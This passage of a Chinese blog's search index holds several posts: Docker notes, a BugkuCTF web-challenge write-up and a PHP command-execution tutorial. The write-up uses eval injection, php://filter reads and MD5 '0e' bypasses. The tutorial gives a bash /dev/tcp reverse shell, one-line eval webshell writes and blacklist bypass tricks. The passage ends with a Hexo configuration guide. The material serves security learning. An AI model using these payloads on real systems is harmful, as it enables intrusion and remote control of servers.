        <tag>nginx</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker从入门到放弃]]></title>
    <url>%2F2018%2F10%2F28%2Fdocker-1%2F</url>
    <content type="text"><![CDATA[docker docker三大核心: 镜像 -镜像不可写 容器 -容器基于镜像生成(可写) 仓库 -仓库存储镜像(类似于Git的管理机制) docker的安装wget -qO- https://get.docker.com/ | sh 安装完后,将docker账户添加到sherdh用户组(非root)以便执行,然后登出再登录否则会报no permissionsudo groupadd dockersudo gpasswd -a $&#123;USER&#125; dockersudo service docker restartnewgrp - docker #启动dockersudo service docker start #测试dockerdocker run hello-world 菜鸟教程 常用命令# 搜索镜像dicker search centos# 下载镜像docker pull name# -t 绑定伪终端 -i 保持标准输入 -d 后台运行 -p 端口映射docker run -t -i -p 1000:80 docker.io/centos /bin/bash# 展示所有镜像docker images# 保存镜像docker save -o centos7.tar docker.io/centos# 载入镜像docker load --input centos7.tar# 保存容器docker export id &gt; name.tar# 载入容器成为镜像cat name.tar | docker import - sherdh/ubuntu:v1.0# 查看正在运行的容器(所有)docker ps （-a）# 启动/终止容器docker start/stop id (-i)# 删除镜像docker rmi id# 删除容器docker rm id 那些折腾第一坑不要强制删除一个存在容器依赖的镜像即 -f ,因为会产生各种莫名其妙的问题先删除容器,如果容器在运行，需要先停止#查看所有容器docker ps -adocker rm 容器id 创建镜像基于已有容器docker commit -a "sherdh" -m "add a new file" 容器id test(新镜像名字) 注意是容器id，不是镜像id 加tagdocker tag test:latest sherdh/test:latest 加了tag后，有两个同id的images这时删除镜像报错Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced in multiple repositories 删除时需要指定名字，而不是id 运行报错standard_init_linux.go:178: exec user process caused “exec format error”查到原因是docker不支持32位ubuntu…乖乖重装系统去 使用dockerfile创建镜像FROM ubuntuMAINTAINER PinE sherdh@gmail.comRUN echo "deb http://archive.ubuntu.com/ubuntu/ raring main universe" &gt;&gt; /etc/apt/sources.listRUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-serverRUN echo "\ndaemon off;" &gt;&gt; /etc/nginx/nginx.conf# 自启动RUN bash -c 'echo "firefox" &gt;&gt; /.bashrc'# 打开端口EXPOSE 5900# 容器启动执行的命令CMD /usr/sbin/nginx]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF-write-up(WEB题)]]></title>
    <url>%2F2018%2F09%2F28%2FBugkuCTF-write-up%2F</url>
    <content type="text"><![CDATA[先放出bugkuctf网址:click me web2 进去一大片的滑稽,速度还越来越快f12看一下，嗯，得flag 计算器要求输入两个一百以内数字相加的结果，输入框限了长度审查元素更改maxlength,提交得flag web基础$_GET显示了以下代码$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 用get传值what=flag web基础$_POST$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 打开hackbarpost数据what=flag 矛盾$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; 要求num=1却不是数字php特性，提交1a (随便加个字母) web3无限弹窗flag就在这里…抓包看一下html实体编码，解一下 域名解析hint:听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag之前是自己傻x了…./etc/hosts 里加个123.206.87.240 flag.bugku.com就好了 你必须让他停下疯狂刷新…..抓包拦截得flag 本地包含 &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; 构造闭合符号就好了hello=); show_source(flag.php 没反应，尴尬hello=); print(flag.php 测试一下输出了flagphp，wtf？过滤了.换个思路hello=);print_r(file("flag.php") 变量1flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; 以为又是绕过，耗了好些时间….后来发现$$php全局变量GLOBALS，$GLOBALS可以调用，果断?args=GLOBALSget it web5hint1:jspfuckhint2:大写f12看到是jsfuck，控制台黏贴回车 头等舱什么也没有？？？抓包看看,有点意思flag在消息头 网站被黑嗯..一个黑页，翻了翻什么都没有上目录扫描器(我这里用dirsearch)用御剑的人会比较多扫到个马,先访问看看，要输密码，随便输一个试试提示不是自己的马不要乱骑…有点意思拿burp挂个字典直接爆破… 管理员系统登录框emmmm,试试万能密码记录ip，还真有点小怕怕呢~插个X-Forwarded-For: 123.206.31.85不报禁止访问了，然后?卡了一会，f12看一下有个注释dGVzdDEyMw== 是base64，解码test123目测是密码，那用户名呢?admin?root?administrator?都不是?不对，换个思路，改X-Forwarded-For: 192.168.1.1再改127.0.0.1成了，咋就忘了这个呢….尴尬 web4usl解码看看，乱七八糟，理一下格式function checkSubmit()&#123; var a=document.getElementById("password"); if("undefined"!=typeof a)&#123; if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) return!0; alert("Error"); a.focus(); return!1 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;eval(unescape(p1) + unescape('%35%34%61%61%32' + p2)); 手动拼接再解码提交67d709b2b54aa2aa648cf6e87a7114f1 flag在index里click me.点之，跳转url有东西http://120.24.86.145:8005/post/index.php?file=show.php 是文件包含，直接filter协议读index.php?file=php://filter/read=convert.base64-encode/resource=index.php 看到了’//flag:flag{edulcni_elif_lacol_si_siht}’ 输入密码查看flag120.24.86.145:8002/baopo/既然都写得这么明明白白的爆破了那就爆破吧五位数数字，要不了多久第一次没爆出来？？？是自己傻逼了，调了5递增…再爆一次 点击一百万次hints:javascriptf12看一下var clicks=0$(function() &#123; $("#cookie") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $("#clickcount").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;);&#125;); 代码都在这里怎么改都行了大于1000000就post个表单。。我干脆构造一个post表单提交就好了 备份是个好习惯备份，典型的源码泄露直接访问index.php.bak下载下来看一下&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125; md5相等，值不等。。php隐式转换的缺陷，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0240610708和QNKCDZO但还是有一个坑str_replace过滤了keyhttp://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO 成了 成绩单嗯，sql注入1' or 1=1# 不报错。union查询和时间盲注丢到sqlmap直接跑 秋名山老司机写个小jio本吧….# !/usr/bin/env python# coding:utf-8import requestsfrom lxml import htmlimport reurl = 'http://123.206.87.240:8002/qiumingshan/'requests = requests.Session()rs = requests.get(url)rs = html.fromstring(rs.content)rs = str(rs.xpath('//div/text()'))rs = eval(rs[2:-5])data=&#123; 'value': rs&#125;rs = requests.post(url,data=data)print rs.content 如果值名不对会提示用value:Give me value post about…. 原来你也是老司机 Bugku{YOU_DID_IT_BY_SECOND}[Finished in 0.9s] 速度要快hint:格式KEY{xxxxxxxxxxxxxx}数据包里有东西看着像base64，解码按照提示POST一个参数margin=WQpzogT0RJek9EVXc=提示让快点，脚本侍候，不行加个解码# !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64url = "http://123.206.87.240:8002/web6/"session = requests.Session()rs = session.get(url).headers['flag']flag = base64.b64decode(base64.b64decode(rs).split(':')[1])payload = &#123;'margin':flag&#125;rs = session.post(url,payload)print rs.content cookies欺骗刚开始还以为真搞cookie实际上是文件包含泄漏主页源码请求url参数经过base64编码，解码发现是keys.txt,把index.php编码一下/web11/index.php?line=&amp;filename=aW5kZXgucGhw 只有一行，注意到line参数# !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64for i in xrange(0,20): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" rs = requests.get(url) print rs.text 循环读一下源码&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 这下名副其实cookie欺骗了]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[命令执行那些事]]></title>
    <url>%2F2018%2F09%2F09%2Fsafe-command-exec%2F</url>
    <content type="text"><![CDATA[命令执行定义使用执行系统命令的函数时，没有进行过滤 继承web服务器权限 命令执行相关函数 system(返回最后一行) exec passthru(返回最后一行) shell_exec 作用与 反引号一致 popen(返回文件指针) proc_open(返回文件指针) pcntl_exec 多进程处理扩展,需额外安装 (string $path, array $args, array $envs) &lt;?php $w = 'whoami'; system($w); passthru($w); echo '&lt;br/&gt;'.'exec:'.exec($w).'&lt;br/&gt;'; echo 'shell_exec:'.shell_exec($w).'&lt;br/&gt;'; echo `$w`; echo popen('whoami','r'); //(cmd,mode[r,w])//读和写 proc_open('proc_open:'.$w).'&lt;br/&gt;'; pcntl_exec('pcntl_exec:'.$w).'&lt;br/&gt;';?&gt; 命令执行防御函数 escapeshellarg() //转义参数 将引号替换为空格 escapeshellcmd() //过滤整条命令(win下加^ linux加\) echo 'ls '.escapeshellarg('a"'); 过滤字符有&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %' " 在不成对情况下也过滤 代码执行相关函数 eval assert preg_replace (php&lt;=5.5) call_user_func call_user_func_array array_map 前两个就不说了，一句话常见 - preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])//搜索subject中匹配pattern的部分， 以replacement进行替换。//当第一个参数的正则表达式有e修正符的时候，第二个参数的字符串当做PHP代码执行 &lt;?php//?cmd=phpinfo()preg_replace(“/test/e”,$_GET["cmd"],”jutsttest”);?&gt; //?value=[phpinfo()]preg_replace('/\[(.*)\]/e', 'strtolower("\\1")', $_GET['value']);//strtolower("\\1")实际就是\1 而\1在正则中有自己的含义 反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 深入研究preg_replace 所以这里的 \1 实际上指定的是第一个子匹配项,即value中第一个子匹配项,达到代码执行目的 - call_user_func()- call_user_func_array()- array_map() //调用其他函数功能//第一个参数为回调函数,后面的参数为回调函数的参数$b = 'phpinfo()';call_user_func($_GET['a'], $b);//当?a=eval时就调用了eval函数而phpinfo()作为参数 命令执行常用符 Windows支持的管道符| 直接执行后边的|| 如果前面执行出错，执行后边，只能为假&amp; 如果前面语句为假则直接执行后边，前边可真可假&amp;&amp; 前边假出错，前边只能为真 Linux支持的管道符; 执行完前边执行后边| 先是后边语句执行结果|| 当前语句执行出错，执行后边&amp; 如果前边为假直接执行后边，前面可真可假&amp;&amp; 如果前边为假出错，只能为真 命令执行的奇淫技巧 绕过黑名单a1;b=s;$a$b 无回显绕过方法 弹shell，nc监听判断 nc -l -p 8080 -vvv|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1 利用DNS隧道参考文章 利用echo写马echo '&lt;?php @eval($_GET[1]);?&gt;'&gt;1.php 如果长度有限制可以追加绕过echo '&lt;?php'&gt;1.phpecho '@eval('&gt;&gt;1.phpecho '$_GET['&gt;&gt;1.phpecho '1]);'&gt;&gt;1.phpecho '?&gt;'&gt;&gt;1.php 或者用反斜杠\拼接echo "&lt;?php @eval(\\$_POST[1]); ?&gt;"\&gt;&gt; 1.php 使用单引号的时候反斜杠会写进语句的里面，所以使用双引号，然后在$的前面加一个反斜杠转义 利用ls写马通过ls -t按时间排列写马echo &gt; '?&gt;'echo &gt; '($_POST[1]);'echo &gt; '@eval'echo &gt; '&lt;?php'ls -t &gt; 1.php]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>渗透测试</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXO配置教程(Next.Mist主题)]]></title>
    <url>%2F2018%2F07%2F24%2Fhexo-config%2F</url>
    <content type="text"><![CDATA[Hexo简介 hexo 一个快速简洁高效的博客框架，其基于Node.js的静态blog程序 作者是台湾的tommy351 什么？你问我为什么不用Wordpress？你猜。 采用第一种的弊端就是”Github Pages”禁了百度爬虫 呵！才不存在呢。我等小萌新没有影响的。 必要前提安装hexo前必须的程序 Node.js Git Hexo官方文档Nodejs官方文档Next官方文档 安装Nodejs#安装nodejs$ sudo git clone https://github.com/nodejs/node.gitCloning into 'node'...#修改目录权限：$ sudo chmod -R 755 node#使用 ./configure 创建编译文件，并按照：$ cd node$ sudo ./configure$ sudo make$ sudo make install#查看 node 版本：$ node --versionv11.1.0 安装Git另一片文章 安装hexo$ npm install hexo-cli -g 创建网站文件$ mkdir blog# 初始化$ hexo init blog &amp;&amp; cd blog 安装hexo插件$ npm install hexo-deployer-git --save$ npm install hexo-asset-image --save# Rss$ npm install hexo-generator-feed --save# sitemap$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save#搜索插件npm install hexo-generator-searchdb --save# 生成 SSH 公钥和密钥 默认生成在根目录的.ssh文件夹下 ~/.ssh$ ssh-keygen -t rsa # 测试 (参数 -v 进入debug模式)$ ssh -t git@github.com $ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s$ hexo d 网站配置文件 配置文件存储位置:blog/_config.yml# Hexo Configuration Hexo配置文件## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# 网站信息# 标题title: Sherdh# 副标题subtitle: 你看，那个人好奇怪哦！是啊，好像一条狗！# 博客描述description: # 作者昵称author: Sherdh# 网站语言，默认英语，设置简体汉语language: zh-CN# 时区，默认电脑时区timezone: Asia/Shanghai# 网址设置# 如果网站是放在子目录中，将url设置成'http://yoursite.com/child'，将root设置成'/child/'# 网址url: https://sherdh.github.io# 网站根目录。如果网站是放在子目录中，将root设置成'子目录名'root: /# 文章链接地址格式 。即文章存放的目录。permalink: :year/:month/:day/:title/permalink_defaults:# 目录设置# 资源文件夹，放在里面的文件会上传到github中source_dir: source# 公共文件夹，存放生成的静态文件public_dir: public# 标签文件夹，默认是tags。实际存放在source/tags中。tag_dir: tagsrss_dir: rss# 档案文件夹，默认是archives。archive_dir: archives# 分类文件夹，默认是categories。实际存放在source/categories中。category_dir: categories# 代码文件夹，默认是downloads/codecode_dir: downloads/code# 国际化文件夹，默认跟language相同i18n_dir: :lang# 不需要渲染的文件夹或文件夹,放在[]中# 这两个文件是百度和google的站长验证文件，不能渲染，否则会改变内容，不能验证过skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, 模板.md]# 写作选项# 新建博文（帖子）的默认名称# File name of new postsnew_post_name: :title.md # 默认布局模板是post，而不是draft和pagedefault_layout: post# 是否将标题转换成标题形式（首字母大写）titlecase: false # Transform title into titlecase# 在新标签页面中打开网页external_link: true # Open external links in new tabfilename_case: 0# 是否渲染草稿render_drafts: false# 启动 Asset 文件夹post_asset_folder: false# 把链接改为与根目录的相对位址relative_link: false# 显示未来的文章future: true# 代码块的设置highlight: enable: true # 使用代码高亮 line_number: true # 显示行号 auto_detect: true # 自动检测语言 tab_replace:# 分类和标签# 默认分类default_category: uncategorized# 分类别名category_map:# 标签别名tag_map:# 日期和时间格式# Hexo 使用 Moment.js 来解析和显示时间。## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# 分页配置# ---------------下面选项需要对应插件的支持---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --save## Set per_page to 0 to disable pagination# 每页显示的文章量 # per_page: 20# 首页的分页设置index_generator: per_page: 5# 归档页的分页设置archive_generator: per_page: 30 yearly: true monthly: true# 标签页的分页设置tag_generator: per_page: 20# 分页路径，在public中可以看到# pagination_dir: page# Extensions 拓展插件配置## Plugins: https://hexo.io/plugins/plugins: baidusitemap: path: baidusitemap.xml# 配置RSSfeed: # feed 类型 (atom/rss2) type: atom # rss 路径 path: atom.xml # 在 rss 中最多生成的文章数(0显示所有) limit: 0# 自定义站点内容搜索# 需要先安装插件：# npm install hexo-generator-search --savesearch: path: search.xml # 如只想索引文章，可设置为post field: all # 主题配置## Themes: https://hexo.io/themes/theme: maupassant# 部署配置## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # 部署到github repository: git@github.com:sherdh/sherdh.github.io.git # 分支默认master branch: maste 主题美化修改文章底部的那个带#号的标签修改模板/themes/next/layout/_macro/post.swig搜索 rel=”tag”&gt;#，将 # 换成 &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束,感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开\themes\next\layout_macro\post.swig文件在post-body 之后， post-footer之前添加&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 然后在主题配置文件中最后加入# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 修改作者头像并旋转打开\themes\next\source\css_common\components\sidebar\sidebar-author.styl在里面添加如下代码：.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形 */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out;&#125;img:hover &#123; /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z 轴旋转动画 */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125; 主页文章添加阴影效果打开\themes\next\source\css_custom\custom.styl,向里面加入： // 主页文章添加阴影效果 .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 美化参考文章]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
